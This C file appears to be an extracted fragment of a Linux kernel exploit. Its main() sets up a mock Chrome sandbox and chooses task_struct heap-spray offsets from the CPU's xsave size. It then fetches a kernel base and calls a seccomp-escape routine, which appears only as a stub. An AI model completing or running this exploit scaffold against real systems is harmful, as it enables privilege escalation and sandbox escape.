#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  _IONBF ; 
 unsigned long get_base () ; 
 int /*<<< orphan*/  install_mock_chrome_sandbox () ; 
 int /*<<< orphan*/  native_cpuid (int*,int*,int*,int*) ; 
 int /*<<< orphan*/  printf (char*) ; 
 int /*<<< orphan*/  pthread_attr_init (int /*<<< orphan*/ *) ; 
 scalar_t__ pthread_attr_setstacksize (int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  setvbuf (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int spray_offset ; 
 int /*<<< orphan*/  srand (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  thread_attr ; 
 int /*<<< orphan*/  time (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  unseccomp () ; 

int main() {

  install_mock_chrome_sandbox();

  setvbuf(stdout, NULL, _IONBF, 0);
  srand(time(NULL));

  // set thread size smaller
  pthread_attr_init(&thread_attr);
  if(pthread_attr_setstacksize(&thread_attr, 0x10000)) {
    printf("set stack size error\n");
    return 0;
  }

  // get cpuid info so we know size of task_struct
  int eax,ebx,ecx,edx;
  eax=0xd;
  ebx = ecx = edx = 0;
  native_cpuid(&eax, &ebx, &ecx, &edx);
  int xsave_size = ebx;

  if(xsave_size == 0x340) {
    spray_offset = 0x55dd00;
    printf("for spray assuming task struct size is 5952\n");
  }
  else if(xsave_size == 0x440) {
    spray_offset = 0x5448c0;
    printf("for spray assuming task struct size is 6208\n");
  }
  else {
    printf("unknown xsave size... exiting since I don't know have the offsets hardcoded for that task save\n");
    return 0;
  }
  printf("check in /sys/kernel/slab/task_struct/object_size to make sure this is right\n");
  printf("If it's wrong the exploit will fail\n");

  unsigned long base = get_base();
  if (base == -1) {
    return -1;
  }

  unseccomp();
  return 0;

}